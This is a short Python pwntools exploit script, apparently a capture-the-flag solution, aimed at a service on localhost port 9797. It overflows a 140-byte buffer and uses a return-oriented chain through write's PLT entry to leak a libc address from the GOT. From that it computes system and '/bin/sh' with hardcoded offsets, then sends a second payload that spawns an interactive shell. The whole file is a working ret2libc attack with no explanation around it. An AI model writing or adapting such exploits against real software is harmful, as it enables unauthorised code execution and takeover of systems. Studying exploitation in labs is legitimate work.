#!/usr/bin/env python

from pwn import *

p = remote('localhost', 9797)

# 0x100 from a20 / aac

# libc write leak
payload = 'a' * 140

'''
0x0804830C - .plt of write
0x080483F4 - read_to_buf
1
0x08049614 - .got.plt of write
4
'''

payload += p32(0x0804830C)
payload += p32(0x080483F4)
payload += p32(1)
payload += p32(0x08049614)
payload += p32(4)

p.send(payload)
WRITE_ADDR = u32(p.recvn(4))
log.info('write addr: 0x%x' % WRITE_ADDR)

LIBC_BASE = WRITE_ADDR - 0x000dafe0
SYSTEM_ADDR = LIBC_BASE + 0x00040310
BINSH_ADDR = LIBC_BASE + 0x16084c

# jump to system
payload = 'a' * 140

'''
SYSTEM_ADDR
'AAAA'
BINSH_ADDR
'''

payload += p32(SYSTEM_ADDR)
payload += 'AAAA'
payload += p32(BINSH_ADDR)

p.send(payload)
p.interactive()
